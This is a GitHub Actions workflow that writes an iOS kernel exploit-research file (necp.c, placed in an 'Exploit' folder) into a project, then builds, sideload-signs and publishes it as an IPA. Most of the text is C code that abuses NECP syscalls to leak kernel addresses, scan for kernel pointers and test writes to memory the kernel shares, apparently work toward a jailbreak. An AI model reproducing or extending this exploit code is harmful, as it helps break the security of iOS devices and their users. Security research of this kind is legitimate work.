name: Fix and Release

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  build:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Cleanup
        run: |
          rm -f .github/workflows/build_and_release.yml
          rm -f .github/workflows/fix_and_test.yml
          rm -f natsuk1/Views/SimpleList.swift

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP_EOF'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/message.h>
          #include <mach/vm_region.h>
          #include "nk_api.h"
          #include "nk_offsets.h"
          extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t*);
          extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
          extern kern_return_t mach_vm_protect(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t);
          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
          #define RESBUF 65536
          static volatile int g_busy = 0;
          static volatile int g_cancel = 0;
          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)
          #define LR(t, ...) lg(t, "> ", __VA_ARGS__)
          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, 0x01, uuid, (size_t)16, p, (size_t)1);
          }
          static int nleak_kva(int fd, uint64_t *out) {
              return (int)syscall(SYS_NECP_ACTION, fd, 0x0D, (void*)0, (size_t)0, (void*)out, (size_t)8);
          }
          static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
              if (len > max) len = max;
              for (int i = 0; i < len; i += 16) {
                  char hex[96];
                  snprintf(hex, sizeof(hex), "%04x: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
                      i, buf[i+0], buf[i+1], buf[i+2], buf[i+3], buf[i+4], buf[i+5], buf[i+6], buf[i+7],
                      buf[i+8], buf[i+9], buf[i+10], buf[i+11], buf[i+12], buf[i+13], buf[i+14], buf[i+15]);
                  LI(tag, "%s", hex);
              }
          }
          static int scan_kptr(const char *tag, const uint8_t *buf, int len) {
              int found = 0;
              for (int i = 0; i + 8 <= len; i += 8) {
                  uint64_t v; memcpy(&v, buf + i, 8);
                  if (is_kptr(v)) { LO(tag, "[%04x] = 0x%llx", i, (unsigned long long)v); found++; if (found >= 24) break; }
              }
              return found;
          }
          static kern_return_t rd(mach_vm_address_t a, void *b, size_t n, mach_vm_size_t *o) {
              return mach_vm_read_overwrite(mach_task_self(), a, n, (mach_vm_address_t)(uintptr_t)b, o);
          }
          static kern_return_t wr(mach_vm_address_t a, const void *b, size_t n) {
              return mach_vm_write(mach_task_self(), a, (vm_offset_t)(uintptr_t)b, (mach_msg_type_number_t)n);
          }
          static kern_return_t prot(mach_vm_address_t a, size_t n, vm_prot_t p) {
              return mach_vm_protect(mach_task_self(), a & ~0xfffULL, n, FALSE, p);
          }
          static int step_shared_test(void) {
              nk_log("");
              LI("S1", "shared-mapping test: write via A, read via B");
              int fdA = nfd();
              int fdB = nfd();
              if (fdA < 0 || fdB < 0) { LE("S1", "open errno=%d", errno); return -1; }
              uint8_t cuA[16]; memset(cuA, 0, sizeof(cuA));
              uint8_t cuB[16]; memset(cuB, 0, sizeof(cuB));
              if (nadd_client(fdA, cuA) != 0) { close(fdA); close(fdB); return -1; }
              if (nadd_client(fdB, cuB) != 0) { close(fdA); close(fdB); return -1; }
              uint64_t uvaA = 0, uvaB = 0;
              nleak_kva(fdA, &uvaA);
              nleak_kva(fdB, &uvaB);
              LI("S1", "uvaA=0x%llx uvaB=0x%llx same=%d",
                 (unsigned long long)uvaA, (unsigned long long)uvaB,
                 uvaA == uvaB ? 1 : 0);

              uint8_t snapA[512]; memset(snapA, 0, sizeof(snapA));
              mach_vm_size_t got = 0;
              kern_return_t kr = rd((mach_vm_address_t)uvaA, snapA, sizeof(snapA), &got);
              LI("S1", "snapshot via A kr=%d got=%llu", kr, (unsigned long long)got);
              LI("S1", "before (A):");
              hexdump("S1B", snapA, 512, 512);

              kr = prot((mach_vm_address_t)uvaA, 0x4000,
                        VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
              LI("S1", "vm_protect(RW_COPY) on A kr=%d", kr);
              kr = prot((mach_vm_address_t)uvaA, 0x4000,
                        VM_PROT_READ | VM_PROT_WRITE);
              LI("S1", "vm_protect(RW) on A kr=%d", kr);

              uint64_t marker = 0xcafebabedeadbeefULL;
              kr = wr((mach_vm_address_t)(uvaA + 0x100), &marker, 8);
              LI("S1", "write marker via A kr=%d", kr);

              uint8_t snapA2[512]; memset(snapA2, 0, sizeof(snapA2));
              kr = rd((mach_vm_address_t)uvaA, snapA2, sizeof(snapA2), &got);
              LI("S1", "re-read via A kr=%d", kr);
              uint64_t checkA = 0;
              memcpy(&checkA, snapA2 + 0x100, 8);
              LI("S1", "A sees at +0x100: 0x%llx", (unsigned long long)checkA);

              uint8_t snapB[512]; memset(snapB, 0, sizeof(snapB));
              kr = rd((mach_vm_address_t)uvaB, snapB, sizeof(snapB), &got);
              LI("S1", "read via B kr=%d", kr);
              uint64_t checkB = 0;
              memcpy(&checkB, snapB + 0x100, 8);
              LI("S1", "B sees at +0x100: 0x%llx", (unsigned long long)checkB);

              if (checkA == marker && checkB == marker) {
                  LO("S1", "SHARED MAPPING CONFIRMED - kernel sees our writes!");
              } else if (checkA == marker) {
                  LW("S1", "COW copy - A sees marker, B does not (kernel does not)");
              } else {
                  LW("S1", "write did not stick");
              }

              close(fdA);
              close(fdB);
              return 0;
          }
          static int step_arena_dump(void) {
              nk_log("");
              LI("S2", "full arena dump via mach_vm_read");
              int fd = nfd();
              if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              uint64_t uva = 0;
              nleak_kva(fd, &uva);
              close(fd);
              LI("S2", "uva=0x%llx", (unsigned long long)uva);

              uint8_t big[512]; memset(big, 0, sizeof(big));
              mach_vm_size_t got = 0;
              kern_return_t kr = rd((mach_vm_address_t)uva, big, sizeof(big), &got);
              LI("S2", "kr=%d got=%llu", kr, (unsigned long long)got);
              hexdump("S2H", big, 512, 512);
              return 0;
          }
          static int step_copy_interface(void) {
              nk_log("");
              LI("S3", "op=0x09 copy_interface idx 1..5 with hexdump");
              int fd = nfd();
              if (fd < 0) { LE("S3", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              for (uint32_t idx = 1; idx <= 5; idx++) {
                  uint8_t ibuf[4]; memcpy(ibuf, &idx, 4);
                  uint8_t buf[256]; memset(buf, 0, sizeof(buf));
                  int c = (int)syscall(SYS_NECP_ACTION, fd, 0x09,
                                       (void*)ibuf, (size_t)4, buf, (size_t)0x74);
                  LI("S3", "idx=%u ret=%d", idx, c);
                  if (c > 0) {
                      hexdump("S3H", buf, c, 0x74);
                      int nk = scan_kptr("S3K", buf, c);
                      LI("S3", "  kptr count = %d", nk);
                  }
              }
              close(fd);
              return 0;
          }
          static int impl(void) {
              nk_log("");
              nk_log("================================================================");
              nk_log("natsuk1 v5.1 - NECP arena shared-write test");
              nk_log("================================================================");
              nk_log("");
              int fd = nfd();
              if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("PRE", "necp_open OK");
              step_arena_dump();
              step_shared_test();
              step_copy_interface();
              nk_log("");
              nk_log("======== done ========");
              return 0;
          }
          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) { nk_log("[!] already running"); return 1; }
              g_cancel = 0;
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }
          void nk_necp_cancel(void) { g_cancel = 1; nk_log("[!] cancel requested"); }
          NECP_EOF

      - name: Install tools
        run: |
          brew install xcodegen ldid || true
          brew link --overwrite xcodegen ldid || true

      - name: Generate project
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
            -sdk iphoneos -destination 'generic/platform=iOS' \
            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
            SWIFT_APPROACHABLE_CONCURRENCY=NO \
            SWIFT_UPCOMING_FEATURE_NONISOLATED_NONSENDING_BY_DEFAULT=NO \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES build -quiet

      - name: Package and Release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          if [ -z "$APP_PATH" ]; then echo "no .app"; exit 1; fi
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then
            gh release delete development --yes --cleanup-tag
          fi
          REPO="${{ github.repository }}"
          IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
          NOTES="natsuk1 v5.1

          IPA: ${IPA_URL}
          AltStore: altstore://install?url=${IPA_URL}
          Scarlet: scarlet://install?url=${IPA_URL}
          ESign: esign://install?url=${IPA_URL}

          $(git log -5 --pretty=format:'- %h %s')"
          gh release create development natsuk1.ipa \
            --target "${{ github.sha }}" \
            --title "Development" --prerelease --latest=false \
            --notes "$NOTES"